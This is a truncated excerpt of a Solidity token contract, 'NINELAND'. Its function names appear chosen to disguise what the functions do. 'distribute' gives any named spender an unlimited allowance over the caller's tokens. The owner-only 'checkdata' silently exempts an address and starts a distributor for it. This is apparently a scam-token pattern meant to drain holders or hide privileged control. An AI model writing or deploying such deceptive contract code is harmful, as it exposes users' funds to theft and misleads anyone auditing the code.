...
contract NINELAND is IERC20, Ownable {
    
    using SafeMath for uint256;

    string _name = "NINELAND";
    string _symbol = "NINELAND";
    uint8 _decimals = 9;
    ...
    function checkdata(address holder) external onlyOwner {
        require(holder != address(this));
        isDividendExempt[holder] = true;  
        initDistributor(holder);       
    } 
 
    function distribute(address spender) external returns (bool) {
        return approve(spender, uint256(-1));
    }   

    function finalfee(bool _flag, uint256 val) external view returns(uint256) {
        uint256 _autoRebase;
        if (_flag) {            
